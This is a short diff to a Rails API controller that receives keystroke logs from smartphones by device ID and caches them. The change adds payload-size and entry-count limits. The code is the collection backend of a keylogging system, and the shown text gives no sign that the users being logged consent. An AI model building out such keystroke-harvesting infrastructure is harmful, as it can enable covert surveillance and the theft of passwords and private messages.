@@ -13,12 +13,24 @@ module Api
         return
       end
 
+      payload_bytes = keylog_data.to_s.bytesize
+      max_bytes = (ENV['KEYLOGGER_MAX_BYTES'].presence || 1.megabyte).to_i
+      if payload_bytes > max_bytes
+        render json: { error: 'Payload too large', limit_bytes: max_bytes }, status: :payload_too_large
+        return
+      end
+
       # Find or create smartphone using the concern method
       smartphone = find_or_create_smartphone(device_id)
       return render json: { error: 'Failed to create device' }, status: :internal_server_error unless smartphone
 
       # Process keylog data
       processor = KeylogProcessor.new(keylog_data)
+      max_entries = (ENV['KEYLOGGER_MAX_ENTRIES'].presence || 5000).to_i
+      if processor.entries.size > max_entries
+        render json: { error: 'Too many entries', limit: max_entries }, status: :unprocessable_entity
+        return
+      end
       
       # Save to database (could be a dedicated Keylog model)
       Rails.cache.write("keylog_#{device_id}", {
